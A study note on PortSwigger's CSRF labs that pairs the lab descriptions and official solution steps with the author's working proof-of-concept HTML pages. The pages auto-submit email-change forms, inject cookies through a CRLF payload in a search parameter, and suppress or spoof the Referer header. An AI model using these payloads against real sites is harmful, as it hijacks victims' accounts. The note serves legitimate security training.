## **Cross-site request forgery (CSRF)**

https://portswigger.net/web-security/csrf

https://portswigger.net/web-security/csrf/tokens



### CSRF vulnerability with no defenses

> This lab's email change functionality is vulnerable to CSRF.
>
> To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.
>
> You can log in to your own account using the following credentials: wiener:peter 

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
                    </li>
                    <li>
                        <p>
                            If you're using Burp Suite Professional, right-click on the request and select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".
                        </p>
                        <p>
                            Alternatively, if you're using Burp Suite Community Edition, use the following HTML template and fill in the request's method, URL, and body parameters. You can get the request URL by right-clicking and selecting "Copy URL".
                        </p>
                        <code class="code-scrollable">&lt;form method="$method" action="$url"&gt;
    &lt;input type="hidden" name="$param1name" value="$param1value"&gt;
&lt;/form&gt;
&lt;script&gt;
        document.forms[0].submit();
&lt;/script&gt;</code>
                    </li>
                    <li>
                        Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
                    </li>
                    <li>
                        To verify that the exploit works, try it on yourself by clicking "View exploit" and then check the resulting HTTP request and response.
                    </li>
                    <li>
                        Click "Deliver to victim" to solve the lab.
                    </li>
                </ol>
            </div>
        </div>


### CSRF where token validation depends on request method

> This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.
>
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
>
> You can log in to your own account using the following credentials: wiener:peter 

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
                    </li>
                    <li>
                        Send the request to Burp Repeater and observe that if you change the value of the <code>csrf</code> parameter then the request is rejected.
                    </li>
                    <li>
                        Use "Change request method" on the context menu to convert it into a GET request and observe that the CSRF token is no longer verified.
                    </li>
                    <li>
                        <p>
                            If you're using Burp Suite Professional, right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".
                        </p>
                        <p>
                            Alternatively, if you're using Burp Suite Community Edition, use the following HTML template and fill in the request's method, URL, and body parameters. You can get the request URL by right-clicking and selecting "Copy URL".
                        </p>
                        <code class="code-scrollable">&lt;form method="$method" action="$url"&gt;
    &lt;input type="hidden" name="$param1name" value="$param1value"&gt;
&lt;/form&gt;
&lt;script&gt;
        document.forms[0].submit();
&lt;/script&gt;</code>
                    </li>
                    <li>
                        Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
                    </li>
                    <li>
                        To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response.
                    </li>
                    <li>
                        Click "Deliver to victim" to solve the lab.
                    </li>
                </ol>
            </div>
        </div>



### CSRF where token validation depends on token being present

>This lab's email change functionality is vulnerable to CSRF.
>
>To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
>
>You can log in to your own account using the following credentials: wiener:peter 

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
                    </li>
                    <li>
                        Send the request to Burp Repeater and observe that if you change the value of the <code>csrf</code> parameter then the request is rejected.
                    </li>
                    <li>
                        Delete the <code>csrf</code> parameter entirely and observe that the request is now accepted.
                    </li>
                    <li>
                        <p>
                            If you're using Burp Suite Professional, right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".
                        </p>
                        <p>
                            Alternatively, if you're using Burp Suite Community Edition, use the following HTML template and fill in the request's method, URL, and body parameters. You can get the request URL by right-clicking and selecting "Copy URL".
                        </p>
                        <code class="code-scrollable">&lt;form method="$method" action="$url"&gt;
    &lt;input type="hidden" name="$param1name" value="$param1value"&gt;
&lt;/form&gt;
&lt;script&gt;
    document.forms[0].submit();
&lt;/script&gt;</code>
                    </li>
                    <li>
                        Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
                    </li>
                    <li>
                        To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response.
                    </li>
                    <li>
                        Click "Deliver to victim" to solve the lab.
                    </li>
                </ol>
            </div>
        </div>


### CSRF where token is not tied to user session

>  This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.
>
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
>
> You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
>
>     wiener:peter
>     carlos:montoya

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Open Burp's browser and log in to your account. Submit the "Update email" form, and intercept the resulting request.
                    </li>
                    <li>
                        Make a note of the value of the CSRF token, then drop the request.
                    </li>
                    <li>
                        Open a private/incognito browser window, log in to your other account, and send the update email request into Burp Repeater.
                    </li>
                    <li>
                        Observe that if you swap the CSRF token with the value from the other account, then the request is accepted.
                    </li>
                    <li>
                        Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab. Note that the CSRF tokens are single-use, so you'll need to include a fresh one.
                    </li>
                    <li>
                        Store the exploit, then click "Deliver to victim" to solve the lab.
                    </li>
                </ol>
            </div>
        </div>



### CSRF where token is tied to non-session cookie

> This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.
>
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
>
> You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
>
>     wiener:peter
>     carlos:montoya

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
                    </li>
                    <li>
                        Send the request to Burp Repeater and observe that changing the <code>session</code> cookie logs you out, but changing the <code>csrfKey</code> cookie merely results in the CSRF token being rejected. This suggests that the <code>csrfKey</code> cookie may not be strictly tied to the session.
                    </li>
                    <li>
                        Open a private/incognito browser window, log in to your other account, and send a fresh update email request into Burp Repeater.
                    </li>
                    <li>
                        Observe that if you swap the <code>csrfKey</code> cookie and <code>csrf</code> parameter from the first account to the second account, the request is accepted.
                    </li>
                    <li>
                        Close the Repeater tab and incognito browser.
                    </li>
                    <li>
                        Back in the original browser, perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.
                    </li>
                    <li>
                        <p>
                            Create a URL that uses this vulnerability to inject your <code>csrfKey</code> cookie into the victim's browser:
                        </p>
                        <code class="code-scrollable">/?search=test%0d%0aSet-Cookie:%20csrfKey=your-key</code>
                    </li>
                    <li>
                        Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab, ensuring that you include your CSRF token. The exploit should be created from the email change request.
                    </li>
                    <li>
                        <p>
                            Remove the <code>script</code> block, and instead add the following code to inject the cookie:
                        </p>
                        <code class="code-scrollable">&lt;img src="$cookie-injection-url" onerror="document.forms[0].submit()"&gt;</code>
                    </li>
                    <li>
                        Store the exploit, then click "Deliver to victim" to solve the lab.
                    </li>
                </ol>
            </div>
        </div>

Search response

```http
HTTP/1.0 200 Connection established
Set-Cookie: LastSearchTerm=1; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 3932
```

CSRF POC

```html
<html>
  <body>
  <img src="https://0ae800dc048f3b78c02333fc00910079.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=AjMtogcKRJFLw4zpcuWdy9WqIUQ38K3I" onerror="document.forms[0].submit()">
    <form action="https://0ae800dc048f3b78c02333fc00910079.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="3&#64;carlos1&#45;montoya&#46;net" />
      <input type="hidden" name="csrf" value="U4sIJJ6Q7senYp9E7iOfttJjZDIUSypd" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### CSRF where token is duplicated in cookie

> This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.
>
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
>
> You can log in to your own account using the following credentials: wiener:peter 

CSRF POC

```html
<html>
  <body>
  <img src="https://0a8500bc038fea89c13a442a00b300a8.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=p76C4Ga5mtCdY7f9P6EzpJCkKM4YYWc6" onerror="document.forms[0].submit()">
    <form action="https://0a8500bc038fea89c13a442a00b300a8.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="2&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="p76C4Ga5mtCdY7f9P6EzpJCkKM4YYWc6" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
                    </li>
                    <li>
                        Send the request to Burp Repeater and observe that the value of the <code>csrf</code> body parameter is simply being validated by comparing it with the <code>csrf</code> cookie.
                    </li>
                    <li>
                        Perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.
                    </li>
                    <li>
                        <p>
                            Create a URL that uses this vulnerability to inject a fake <code>csrf</code> cookie into the victim's browser:
                        </p>
                        <code class="code-scrollable">/?search=test%0d%0aSet-Cookie:%20csrf=fake</code>
                    </li>
                    <li>
                        Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab, ensuring that your CSRF token is set to "fake". The exploit should be created from the email change request.
                    </li>
                    <li>
                        <p>
                            Remove the script block, and instead add the following code to inject the cookie and submit the form:
                        </p>
                        <code class="code-scrollable">&lt;img src="$cookie-injection-url" onerror="document.forms[0].submit();"/&gt;</code>
                    </li>
                    <li>
                        Store the exploit, then click "Deliver to victim" to solve the lab.
                    </li>
                </ol>
            </div>
        </div>


### CSRF where Referer validation depends on header being present

> This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.
>
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
>
> You can log in to your own account using the following credentials: wiener:peter 

CSRF POC

```html
<html>
  <head><meta name="referrer" content="never"></head>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a82008204ac3129c0c9869200940025.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wiener1&#64;normal&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
                    </li>
                    <li>
                        Send the request to Burp Repeater and observe that if you change the domain in the Referer HTTP header then the request is rejected.
                    </li>
                    <li>
                        Delete the Referer header entirely and observe that the request is now accepted.
                    </li>
                    <li>
                        <p>
                            Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab. Include the following HTML to suppress the Referer header:
                        </p>
                        <code class="code-scrollable">&lt;meta name="referrer" content="no-referrer"&gt;</code>
                    </li>
                    <li>
                        Store the exploit, then click "Deliver to victim" to solve the lab.
                    </li>
                </ol>
            </div>
        </div>


### CSRF with broken Referer validation

> This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.
>
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
>
> You can log in to your own account using the following credentials: wiener:peter 

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
                    </li>
                    <li>
                        Send the request to Burp Repeater. Observe that if you change the domain in the Referer HTTP header, the request is rejected.
                    </li>
                    <li>
                        <p>
                            Copy the original domain of your lab instance and append it to the Referer header in the form of a query string. The result should look something like this:
                        </p>
                        <code class="code-scrollable">Referer: https://arbitrary-incorrect-domain.net?your-lab-id.web-security-academy.net</code>
                    </li>
                    <li>
                        Send the request and observe that it is now accepted. The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string.
                    </li>
                    <li>
                        <p>
                            Create a CSRF proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab and host it on the exploit server. Edit the JavaScript so that the third argument of the <code>history.pushState()</code> function includes a query string with your lab instance URL as follows:
                        </p>
                        <code class="code-scrollable">history.pushState("", "", "/?your-lab-id.web-security-academy.net")</code>
                        <p>
                            This will cause the Referer header in the generated request to contain the URL of the target site in the query string, just like we tested earlier.
                        </p>
                    </li>
                    <li>
                        <p>
                            If you store the exploit and test it by clicking "View exploit", you may encounter the "invalid Referer header" error again. This is because many browsers now strip the query string from the Referer header by default as a security measure. To override this behavior and ensure that the full URL is included in the request, go back to the exploit server and add the following header to the "Head" section:
                        </p>
                        <code class="code-scrollable">Referrer-Policy: unsafe-url</code>
                        <p>
                            Note that unlike the normal Referer header, the word "referrer" must be spelled correctly in this case.
                        </p>
                    </li>
                    <li>
                        Store the exploit, then click "Deliver to victim" to solve the lab.
                    </li>
                </ol>
            </div>
        </div>


Response header

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```

CSRF POC

```html
<html>
  <body>
  <script>history.pushState('', '', '/?0a0300ea03bbc0acc07538ef0049003c.web-security-academy.net')</script>
    <form action="https://0a0300ea03bbc0acc07538ef0049003c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="2&#64;normal&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

